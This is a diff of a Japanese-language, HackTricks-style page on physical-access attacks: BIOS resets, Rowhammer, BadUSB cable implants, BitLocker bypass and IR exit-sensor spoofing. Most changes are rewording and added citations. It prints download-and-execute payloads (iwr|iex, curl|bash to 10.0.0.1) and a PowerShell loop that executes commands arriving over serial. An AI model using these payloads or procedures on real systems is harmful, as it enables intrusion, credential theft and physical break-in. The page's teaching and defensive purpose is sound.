@@ -4,15 +4,15 @@
 
 ## BIOS Password Recovery and System Security
 
-**BIOSのリセット**は、いくつかの方法で実行できます。多くのマザーボードには、**バッテリー**があり、これを約**30分**取り外すと、パスワードを含むBIOS設定がリセットされます。別の方法として、**マザーボード上のジャンパー**を調整し、特定のピンを接続することでこれらの設定をリセットできます。
+**BIOSのリセット**は、いくつかの方法で実行できます。ほとんどのマザーボードには**バッテリー**が搭載されており、これを約**30分間**取り外すと、パスワードを含むBIOS設定がリセットされます。あるいは、**マザーボード上のジャンパー**を調整し、特定のピンを接続することで、これらの設定をリセットできます。
 
-ハードウェアの調整ができない、または現実的でない場合は、**ソフトウェアツール**が解決策になります。**Kali Linux**のようなディストリビューションを含む**Live CD/USB**からシステムを起動すると、**_killCmos_** や **_CmosPWD_** などのツールにアクセスでき、BIOSパスワードの回復を支援できます。
+ハードウェアの調整が不可能または現実的でない場合は、**ソフトウェアツール**が解決策になります。**Kali Linux**などのディストリビューションを使って**Live CD/USB**からシステムを起動すると、BIOSパスワードの復旧に役立つ**_killCmos_**や**_CmosPWD_**などのツールにアクセスできます。
 
-BIOSパスワードが不明な場合、**3回**誤って入力すると、通常はエラーコードが表示されます。このコードは [https://bios-pw.org](https://bios-pw.org) のようなウェブサイトで使用して、利用可能なパスワードを取得できる場合があります。
+BIOSパスワードが不明な場合、通常はパスワードを**3回**間違えて入力すると、エラーコードが表示されます。このコードを [https://bios-pw.org](https://bios-pw.org) のようなWebサイトで使用すると、利用可能なパスワードを取得できる可能性があります。
 
 ### UEFI Security
 
-**UEFI**を従来のBIOSの代わりに使用している最新システムでは、**chipsec** ツールを利用して、**Secure Boot** の無効化を含むUEFI設定の分析や変更ができます。これは次のコマンドで実行できます：
+従来のBIOSではなく**UEFI**を使用する最新のシステムでは、**chipsec**を利用して、**Secure Boot**の無効化を含むUEFI設定の分析や変更を行えます。これは、次のコマンドで実行できます。
 ```bash
 python chipsec_main.py -module exploits.secure.boot.pk
 ```
@@ -20,42 +20,42 @@ python chipsec_main.py -module exploits.secure.boot.pk
 
 ## RAM Analysis and Cold Boot Attacks
 
-RAM は、電源断後もしばらくデータを保持し、通常 **1〜2分** は残ります。この保持時間は、液体窒素のような冷却物質を適用することで **10分** まで延長できます。この延長された期間に、**dd.exe** や **volatility** のようなツールを使って解析用の **memory dump** を作成できます。
+RAMは電源が切られた後も、通常 **1～2分間** データを保持します。この保持時間は、液体窒素などの低温物質を使用することで **10分間** まで延長できます。この延長された時間内に、**dd.exe** や **volatility** などのツールを使用して **memory dump** を作成し、分析できます。
 
 ---
 
 ## GPU Rowhammer Against Page Tables
 
-現代の GPU Rowhammer 攻撃は、通常のバッファではなく **GPU virtual-memory metadata** を標的にすると、はるかに有用になります。**GDDR6 NVIDIA Ampere GPUs** に関する最近の研究では、特権なしの CUDA code を実行する attacker が GPU 固有の hammering パターンを構築し、**memory massaging** を使って paging 構造を脆弱な行に配置し、さらに **last-level page table** または中間の **page directory** の bit を反転できることが示されています。1つでも translation entry が破損すると、attacker は **arbitrary GPU memory read/write** を足場にして、その後 host compromise に進めます。
+Modern GPU Rowhammer attacksは、通常のバッファではなく **GPU virtual-memory metadata** を標的にすると、はるかに有用になります。**GDDR6 NVIDIA Ampere GPUs** に関する最近の研究では、攻撃者が権限のない CUDA codeを実行し、GPU固有の hammeringパターンを構築し、**memory massaging** を使って paging structuresを脆弱な rowに配置し、その後 **last-level page table** または中間の **page directory** の bitを反転できることが示されています。1つの translation entryが破損すると、攻撃者は **arbitrary GPU memory read/write** を実現し、さらに host compromiseへ pivotできます。<sup>[[1]](#references)[[2]](#references)</sup>
 
 ### Exploitation Pattern
 
-1. **Profile hammerable rows** を GDDR6 で行い、DRAM 内 mitigation を回避する refresh-aware / non-uniform hammering パターンを構築する。
-2. **Massage GPU allocations** して、driver が page-translation structures をデフォルトの保護済み pool ではなく、hammerable な物理位置に配置するようにする。実際には、low-memory page-table region を枯渇させ、制御された stride で大きな sparse UVM mapping を spray することを意味する場合があります。
-3. **PFN** や page-table / page-directory entry 内の aperture 関連 bit などの translation metadata を flip し、attacker-controlled の virtual page が page-table pages、任意の GPU memory、または host-visible system mappings に解決されるようにする。
-4. 偽造した mapping を再利用して追加の translation entries を書き換え、GPU contexts 全体で **arbitrary GPU memory read/write** へ昇格する。
+1. GDDR6で **profile hammerable rows** を行い、DRAM内の mitigationを回避する refresh-aware / non-uniform hammeringパターンを構築します。
+2. **Massage GPU allocations** を行い、driverが page-translation structuresをデフォルトの保護された poolに保持せず、hammerableな physical locationsに配置するようにします。実際には、low-memory page-table regionを使い果たし、制御された strideで大規模な sparse UVM mappingsを sprayする方法などがあります。
+3. page-table / page-directory entry内の **PFN** や aperture関連のbitなどの **translation metadata** を反転させ、攻撃者が制御する virtual pageが page-table pages、任意の GPU memory、または host-visible system mappingsに解決されるようにします。
+4. 偽造した mappingを再利用して追加の translation entriesを書き換え、GPU contexts全体に対する **arbitrary GPU memory read/write** へ escalationします。
 
 ### Host Pivot and Mitigations
 
-- **IOMMU disabled** の場合、偽造された system-aperture mappings により任意の **host physical memory** が GPU に露出し、GPU primitive が完全な host compromise に変わる。
-- **GDDRHammer** は last-level page-table entries を標的にし、**GeForge** は page-directory level の破損の方が簡単な場合があることを示している。これは、1 bit の flip だけでより大きな translation subtree を retarget できるためである。security-critical なのは paging layer 1つだけだとみなしてはならない。
-- **IOMMU** はなお重要である。なぜなら、GDDRHammer/GeForge で使われる直接的な arbitrary-host-memory path を遮断するからだ。ただし、**complete mitigation** ではない。**GPUBreach** は第2段階の pivot を示しており、attacker が GPU-writable で driver-owned な CPU buffers を破損し、その後 NVIDIA driver の memory-safety bugs を誘発して kernel write primitive と **root shell** を、IOMMU enabled のまま取得する。
-- **System-level ECC** は、対応する workstation/server GPUs では実用的な hardening step である。ECC のない consumer GPUs は、より弱い defense surface を露出する。
-- これらの攻撃は純粋に理論上のものではない。**GeForge** は RTX 3060 で **1,171** 個、RTX A6000 で **202** 個の bit flips を報告しており、これだけで実用的な host-privilege-escalation chain を構築するのに十分だった。
+- **IOMMU disabled** の場合、偽造した system-aperture mappingsによって任意の **host physical memory** がGPUに公開され、GPU primitiveが完全な host compromiseにつながります。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
+- **GDDRHammer** は last-level page-table entriesを標的にします。一方、**GeForge** は page-directory levelを破損させる方が容易な場合があることを示しています。1つのbit flipで、より大きな translation subtreeの宛先を変更できるためです。1つの paging layerだけを security-criticalとして扱わないでください。<sup>[[1]](#references)[[2]](#references)</sup>
+- **IOMMU** は、GDDRHammer/GeForgeが使用する直接的な arbitrary-host-memory pathをブロックするため、依然として重要です。しかし、**complete mitigation** ではありません。**GPUBreach** は、攻撃者がGPUから書き込み可能な driver所有のCPU buffersを破損させ、その後 NVIDIA driverの memory-safety bugsを triggerして kernel write primitiveを取得し、IOMMUが有効な場合でも **root shell** を得る second-stage pivotを示しています。<sup>[[3]](#references)</sup>
+- **System-level ECC** は、対応する workstation/server GPUsにおける実用的な hardening stepです。ECCを搭載しない Consumer GPUsでは、より弱い defense surfaceが露呈します。<sup>[[4]](#references)</sup>
+- これらの attacksは純粋な理論ではありません。**GeForge** は RTX 3060で **1,171** 回、RTX A6000で **202** 回の bit flipsを報告しており、working host-privilege-escalation chainの構築には十分な数でした。<sup>[[2]](#references)[[9]](#references)</sup>
 
 ---
 
 ## Direct Memory Access (DMA) Attacks
 
-**INCEPTION** は、**FireWire** や **Thunderbolt** のような interfaces と互換性のある DMA を通じて **physical memory manipulation** を行うための tool である。memory を patch して任意の password を受け入れさせることで、login procedures を bypass できる。ただし、**Windows 10** systems には効果がない。
+**INCEPTION** は、**FireWire** や **Thunderbolt** などの interfacesと互換性がある、DMAを通じた **physical memory manipulation** 用の toolです。memoryを patchして任意の passwordを受け入れさせることで、login proceduresを bypassできます。ただし、**Windows 10** systemsに対しては効果がありません。
 
 ---
 
 ## Live CD/USB for System Access
 
-**_sethc.exe_** や **_Utilman.exe_** のような system binaries を **_cmd.exe_** の copy に置き換えると、system privileges で command prompt を得られる。**chntpw** のような tool は、Windows installation の **SAM** file を edit するために使え、password changes を可能にする。
+**_sethc.exe_** や **_Utilman.exe_** などの system binariesを **_cmd.exe_** の copyに置き換えると、system privilegesを持つ command promptを提供できます。**chntpw** などの toolsを使用して、Windows installationの **SAM** fileを編集し、passwordを変更できます。
 
-**Kon-Boot** は、Windows kernel または UEFI を一時的に変更することで、password を知らなくても Windows systems に login できるようにする tool である。詳細は [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/) を参照。
+**Kon-Boot** は、Windows kernelまたはUEFIを一時的に変更することで、passwordを知らずに Windows systemsへ logging inできるようにする toolです。詳細は [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/) で確認できます。<sup>[[10]](#references)</sup>
 
 ---
 
@@ -63,137 +63,138 @@ RAM は、電源断後もしばらくデータを保持し、通常 **1〜2分**
 
 ### Boot and Recovery Shortcuts
 
-- **Supr**: BIOS settings にアクセスする。
-- **F8**: Recovery mode に入る。
-- Windows banner の後に **Shift** を押すと autologon を bypass できる。
+- **Supr**: BIOS settingsにアクセスします。
+- **F8**: Recovery modeに入ります。
+- Windows bannerの後に **Shift** を押すと、autologonを bypassできます。
 
 ### BAD USB Devices
 
-**Rubber Ducky** や **Teensyduino** のような device は、target computer に接続されたときに事前定義された payload を実行できる **bad USB** device を作成するための platform である。
+**Rubber Ducky** や **Teensyduino** などの devicesは、target computerに接続された際に predefined payloadsを実行できる **bad USB** devicesを作成するための platformsとして機能します。
 
 ### Volume Shadow Copy
 
-Administrator privileges があれば、PowerShell を通じて **SAM** file を含む機密ファイルの copy を作成できる。
+Administrator privilegesがあれば、PowerShellを通じて **SAM** fileを含む sensitive filesの copiesを作成できます。
 
 ## BadUSB / HID Implant Techniques
 
 ### Wi-Fi managed cable implants
 
-- **Evil Crow Cable Wind** のような ESP32-S3 ベースの implant は、USB-A→USB-C または USB-C↔USB-C cable 内に隠れ、純粋に USB keyboard として enumerate し、C2 stack を Wi-Fi 経由で公開する。operator は victim host から cable に電力を供給し、`Evil Crow Cable Wind` という名前で password `123456789` の hotspot を作成し、[http://cable-wind.local/](http://cable-wind.local/)（またはその DHCP address）を開いて埋め込みの HTTP interface に到達するだけでよい。
-- browser UI には *Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell*、*Config* の tabs がある。保存された payload は OS ごとにタグ付けされ、keyboard layouts はその場で切り替えられ、VID/PID strings も既知の peripheral を真似るよう変更できる。
-- C2 が cable 内にあるため、phone だけで payload を stage し、execution を trigger し、Wi-Fi credentials を管理でき、host OS に触れる必要がない。短時間の physical intrusion に理想的である。
+- **Evil Crow Cable Wind** などの ESP32-S3 based implantsは、USB-A→USB-CまたはUSB-C↔USB-C cablesの内部に隠れ、USB keyboardとしてのみ enumerateし、Wi-Fi経由で C2 stackを公開します。operatorは victim hostから cableに電力を供給し、password `123456789` の hotspot `Evil Crow Cable Wind` を作成して、[http://cable-wind.local/](http://cable-wind.local/)（またはその DHCP address）を browseするだけで、組み込みの HTTP interfaceにアクセスできます。<sup>[[8]](#references)</sup>
+- Browser UIには、*Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell*、*Config* の tabsがあります。保存された payloadsには OSごとの tagが付けられ、keyboard layoutsは on the flyで切り替えられ、VID/PID stringsは既知の peripheralsを mimicするよう変更できます。
+- C2が cable内に存在するため、phoneから payloadsを stageし、executionを triggerし、host OSに触れることなく Wi-Fi credentialsを管理できます。これは、短い dwell-timeの physical intrusionsに適しています。
 
 ### OS-aware AutoExec payloads
 
-- AutoExec rules は、USB enumeration の直後に 1 つ以上の payload が即時実行されるように binding する。implant は軽量な OS fingerprinting を行い、対応する script を選択する。
+- AutoExec rulesは、USB enumeration直後に fireする1つ以上の payloadsを bindします。implantは軽量な OS fingerprintingを実行し、一致する scriptを選択します。
 - Example workflow:
 - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
-- *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
-- execution が unattended なので、充電 cable を差し替えるだけで、ログオン中 user context で “plug-and-pwn” initial access を達成できる。
+- *macOS/Linux:* `COMMAND SPACE` (Spotlight) または `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
+- Executionは unattendedで行われるため、charging cableを交換するだけで、logged-on user contextの下で「plug-and-pwn」による initial accessを実現できます。
 
 ### HID-bootstrapped remote shell over Wi-Fi TCP
 
-1. **Keystroke bootstrap:** 保存済み payload が console を開き、新しい USB serial device に到着したものを何でも実行する loop を貼り付ける。Windows の最小例は:
+1. **Keystroke bootstrap:** 保存された payloadが consoleを開き、新しい USB serial deviceに届くものをすべて実行する loopを pasteします。最小限の Windows variantは次のとおりです。
 ```powershell
 $port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
 $port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
 ```
-2. **Cable bridge:** implantはUSB CDCチャネルを開いたままにし、その間にESP32-S3がoperatorへ向けてTCP client（Python script、Android APK、またはdesktop executable）を起動する。TCP sessionに入力された任意のbytesは上記のserial loopへ転送され、air-gapped host上でもremote command executionが可能になる。出力は制限されているため、operatorは通常、blind commands（account creation、追加toolingのstagingなど）を実行する。
+2. **Cable bridge:** implant は USB CDC channel を open のまま維持し、ESP32-S3 から operator に向けて TCP client（Python script、Android APK、または desktop executable）を起動します。TCP session に入力されたあらゆる byte は上記の serial loop に forward されるため、air-gapped host 上でも remote command execution が可能です。Output は limited なので、operator は通常、blind command（account creation、追加 tooling の staging など）を実行します。
 
 ### HTTP OTA update surface
 
-- 同じweb stackは通常、unauthenticatedなfirmware updatesも公開している。Evil Crow Cable Windは`/update`で待ち受け、アップロードされたbinaryをそのままflashする:
+- 同じ web stack では通常、unauthenticated firmware update も公開されています。Evil Crow Cable Wind は `/update` で listen し、upload された任意の binary を flash します:
 ```bash
 curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
 ```
-- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.
+- Field operators can hot-swap features（例：flash USB Army Knife firmware）mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.
 
-## BitLocker Encryption のバイパス
+## BitLocker Encryption の Bypassing
 
-BitLocker encryption は、**recovery password** がメモリダンプファイル (**MEMORY.DMP**) 内に見つかった場合、バイパスできる可能性があります。これには、**Elcomsoft Forensic Disk Decryptor** や **Passware Kit Forensic** などのツールを利用できます。
-
----
-
-## Recovery Key 追加のための Social Engineering
-
-新しい BitLocker recovery key は、Social Engineering を使って追加できます。ユーザーにコマンドを実行させて、ゼロで構成された新しい recovery key を追加させるよう誘導し、復号プロセスを簡単にします。
+BitLocker encryption は、**recovery password** が memory dump file（**MEMORY.DMP**）内から見つかった場合、potentially bypass できます。この目的には、**Elcomsoft Forensic Disk Decryptor** や **Passware Kit Forensic** などの Tools を利用できます。
 
 ---
 
-## BIOS を Factory-Reset するための Chassis Intrusion / Maintenance Switch の悪用
+## Recovery Key Addition の Social Engineering
 
-多くの現代的な laptop や small-form-factor desktop には、Embedded Controller (EC) と BIOS/UEFI firmware によって監視される **chassis-intrusion switch** が搭載されています。スイッチの主な目的は、デバイスが開封されたときに警告を出すことですが、vendor は特定のパターンでスイッチが切り替えられたときに発動する、**documented されていない recovery shortcut** を実装していることがあります。
+Social engineering tactics により、ユーザーを説得して recovery key を追加する command を実行させることで、新しい BitLocker recovery key を追加できます。この key は zeros で構成され、decryption process を簡略化できます。
 
-### 攻撃の仕組み
+---
 
-1. スイッチは EC 上の **GPIO interrupt** に配線されています。
-2. EC 上で動作する firmware は、**押下のタイミングと回数** を追跡します。
-3. ハードコードされたパターンが認識されると、EC は system NVRAM/CMOS の内容を **erase** する *mainboard-reset* ルーチンを呼び出します。
-4. 次回起動時に BIOS は default 値を読み込みます – **supervisor password、Secure Boot keys、そしてすべての custom configuration は消去されます**。
+## Chassis Intrusion / Maintenance Switches を Exploiting して BIOS を Factory-Reset する
 
-> Secure Boot が無効化され、firmware password が消えた後は、攻撃者は任意の external OS image で起動し、internal drives への制限なしのアクセスを取得できます。
+多くの modern laptops や small-form-factor desktops には、Embedded Controller（EC）および BIOS/UEFI firmware によって監視される **chassis-intrusion switch** が搭載されています。この switch の主な目的は device が開かれた際に alert を発生させることですが、vendors が、switch を特定の pattern で toggled した際に trigger される **undocumented recovery shortcut** を実装している場合があります。<sup>[[5]](#references)[[6]](#references)</sup>
 
-### 実例 – Framework 13 Laptop
+### Attack の仕組み
 
-Framework 13 (11th/12th/13th-gen) の recovery shortcut は次のとおりです:
+1. Switch は EC 上の **GPIO interrupt** に接続されています。
+2. EC 上で実行される firmware が、**timing と presses の回数**を追跡します。
+3. hard-coded pattern が recognised されると、EC は *mainboard-reset* routine を呼び出し、system NVRAM/CMOS の内容を **erases** します。
+4. 次回 boot 時に BIOS は default values を読み込みます。**supervisor password、Secure Boot keys、すべての custom configuration が clear されます**。
+
+> Secure Boot が disabled になり firmware password がなくなると、attacker は任意の external OS image を boot するだけで、internal drives へ unrestricted access を取得できます。
+
+### Real-World Example – Framework 13 Laptop
+
+Framework 13（11th/12th/13th-gen）の recovery shortcut は次のとおりです。
 ```text
 Press intrusion switch  →  hold 2 s
 Release                 →  wait 2 s
 (repeat the press/release cycle 10× while the machine is powered)
 ```
-10回目のサイクル後、ECは次回の再起動時にBIOSへNVRAMを消去するよう指示するフラグを設定する。手順全体は約40秒で、**必要なのはドライバー1本だけ**である。
+10回目のサイクル後、ECは次回の再起動時にBIOSへNVRAMを消去させるフラグを設定します。手順全体にかかる時間は約40秒で、必要なのは**ドライバーだけ**です。<sup>[[5]](#references)</sup>
 
 ### Generic Exploitation Procedure
 
-1. ECが動作している状態にするため、対象を電源投入するか、サスペンド復帰させる。
-2. 下部カバーを外して、intrusion/maintenance switch を露出させる。
-3. ベンダー固有のトグルパターンを再現する（ドキュメント、フォーラムを参照するか、ECファームウェアをリバースエンジニアリングする）。
-4. 再組み立てして再起動する – firmware protections は無効化されているはずである。
-5. live USB（例: Kali Linux）で起動し、通常の post-exploitation（credential dumping、data exfiltration、malicious EFI binaries の埋め込みなど）を実行する。
+1. 対象を電源オンにするか、サスペンドから復帰させてECを稼働させます。
+2. 底面カバーを取り外し、侵入検知／メンテナンススイッチを露出させます。
+3. ベンダー固有のトグルパターンを再現します（ドキュメントやフォーラムを参照するか、EC firmwareをreverse-engineerします）。
+4. 再組み立てしてrebootします – firmware protectionsが無効化されているはずです。
+5. live USB（例：Kali Linux）をbootし、通常のpost-exploitation（credential dumping、data exfiltration、malicious EFI binariesのimplantingなど）を実行します。
 
 ### Detection & Mitigation
 
-* OS management console で chassis-intrusion イベントをログに記録し、予期しないBIOS reset と相関させる。
-* 開封検知のため、ネジ/カバーに **tamper-evident seals** を使用する。
-* デバイスは **physically controlled areas** に保管する; 物理アクセスは完全な compromise に等しいとみなす。
-* 可能であれば、ベンダーの “maintenance switch reset” 機能を無効化するか、NVRAM reset に追加の暗号学的認可を要求する。
+* OS management consoleでchassis-intrusionイベントを記録し、予期しないBIOS resetsと相関させます。
+* ネジやカバーに**tamper-evident seals**を使用し、開封を検知します。
+* デバイスを**物理的に管理されたエリア**に保管します。physical accessはfull compromiseと同等だと想定してください。
+* 利用可能な場合は、ベンダーの「maintenance switch reset」featureを無効化するか、NVRAM resetsに追加のcryptographic authorisationを要求します。
 
 ---
 
-## Covert IR Injection Against No-Touch Exit Sensors
+## No-Touch Exit Sensorsに対するCovert IR Injection
 
 ### Sensor Characteristics
-- 一般的な “wave-to-exit” センサーは、近赤外LEDエミッタとTVリモコン型の受信モジュールを組み合わせており、正しいキャリアのパルスを複数回（約4～10回）受信した後にのみ logic high を報告する。
-- プラスチック製のシュラウドがエミッタと受信部が直接見合うのを遮るため、コントローラは、検証済みのキャリアは近くの反射に由来すると想定し、door strike を開ける relay を駆動する。
-- コントローラがターゲットの存在を認識すると、しばしば outbound modulation envelope を変更するが、受信機はフィルタされたキャリアに一致する burst であれば引き続き受け付ける。
+- 一般的な「wave-to-exit」sensorsは、near-IR LED emitterとTV remote styleのreceiver moduleを組み合わせたもので、正しいcarrier（約30 kHz）のpulseを複数回（約4～10回）検知した後にのみlogic highを報告します。<sup>[[7]](#references)</sup>
+- Plastic shroudによってemitterとreceiverが互いを直接見ることが防がれているため、controllerは検証済みのcarrierが近距離のreflectionから来たものと判断し、door strikeを開くrelayを駆動します。
+- controllerがtargetの存在を認識すると、outbound modulation envelopeを変更することが多い一方、receiverはfiltered carrierに一致するburstを引き続き受け入れます。
 
 ### Attack Workflow
-1. **Emission profile を取得する** – logic analyser をコントローラのピンにクリップし、内部IR LEDを駆動する検出前と検出後の両方の waveform を記録する。
-2. **“post-detection” waveform だけを再生する** – 標準のエミッタを取り外す/無視し、すでにトリガーされたパターンで外部IR LEDを最初から駆動する。受信機はパルス数/周波数だけを気にするため、偽装したキャリアを本物の反射とみなし、relay line をアサートする。
-3. **Transmission をゲートする** – キャリアを調整された burst（例: 数十ミリ秒ON、同程度OFF）で送信し、受信機の AGC や interference handling logic を飽和させずに必要最小限のパルス数を届ける。連続発光はセンサーをすぐに鈍化させ、relay の動作を止めてしまう。
+1. **emission profileをcaptureする** – controller pins間にlogic analyserを接続し、内蔵IR LEDを駆動する、detection前後両方のwaveformを記録します。
+2. **「post-detection」waveformのみをreplayする** – stock emitterを取り外すか無視し、最初からtrigger済みのpatternで外部IR LEDを駆動します。receiverはpulse count/frequencyのみを判定するため、spoofしたcarrierを正規のreflectionとして扱い、relay lineをassertします。
+3. **transmissionをgateする** – carrierを調整したburst（例：数十ミリ秒オン、同程度オフ）で送信し、receiverのAGCやinterference handling logicを飽和させずに最小限のpulse countを届けます。連続emissionではsensorが急速にdesensitiseされ、relayの作動が停止します。
 
 ### Long-Range Reflective Injection
-- ベンチ用LEDを高出力IRダイオード、MOSFET driver、集光 optics に置き換えることで、約6m先からでも確実にトリガーできる。
-- 攻撃者は受信機開口部への line-of-sight を必要としない。ガラス越しに見える室内壁、棚、ドア枠へビームを向ければ、反射エネルギーが約30°の field of view に入り、近距離の手振りを模倣できる。
-- 受信機は弱い反射のみを想定しているため、はるかに強力な外部ビームでも複数表面で反射して検出閾値を超えたまま維持できる。
+- bench LEDをhigh-power IR diode、MOSFET driver、focusing opticsに置き換えることで、約6 m離れた位置から安定してtriggerできます。
+- attackerはreceiver apertureへのline-of-sightを必要としません。ガラス越しに見える室内の壁、棚、door frameへbeamを向けることで、反射したenergyを約30°のfield of viewに入射させ、近距離でのhand waveを模倣できます。
+- receiverは弱いreflectionのみを想定しているため、はるかに強い外部beamでも複数のsurfaceでbounceさせながら、detection thresholdを上回る状態を維持できます。
 
 ### Weaponised Attack Torch
-- 市販の懐中電灯に driver を組み込むと、道具を目立たず隠せる。可視LEDを受信機の band に合った高出力IR LEDへ交換し、約30 kHzの burst を生成するために ATtiny412（または同等品）を追加し、LED電流を sink するために MOSFET を使う。
-- 伸縮式 zoom lens により range/precision のためにビームを絞り、MCU制御の vibration motor は可視光を出さずに modulation が有効であることを触覚で確認できる。
-- 保存済みの複数の modulation pattern（わずかに異なる carrier frequency と envelope）を順に切り替えることで、再ブランド化された sensor family 全体での互換性が向上し、操作者は relay が音を立てて click し door が解放されるまで反射面をスイープできる。
+- driverを市販のflashlight内部に組み込むことで、toolを目立たない形で隠せます。visible LEDをreceiverのbandに適合するhigh-power IR LEDへ交換し、ATtiny412（または同等品）を追加して約30 kHzのburstを生成し、MOSFETでLED currentをsinkします。
+- telescopic zoom lensによってrange/precision向けにbeamを絞り、MCU controlの下にvibration motorを配置することで、visible lightを発せずにmodulationがactiveであることをhaptic confirmationできます。
+- 複数の保存済みmodulation pattern（carrier frequencyとenvelopeを少しずつ変えたもの）をcycleすると、rebrandedされた複数のsensor familyとのcompatibilityが向上します。これにより、operatorはreflective surfaceをsweepし、relayが audibleにclickしてdoorがreleaseされるまで試行できます。
 
 ---
 
 ## References
 
-- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
-- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
-- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
-- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
-- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
-- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
-- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
-- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
-- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
+- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
+- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
+- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
+- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
+- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
+- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
+- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
+- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
+- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
+- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)
 
 {{#include ../banners/hacktricks-training.md}}
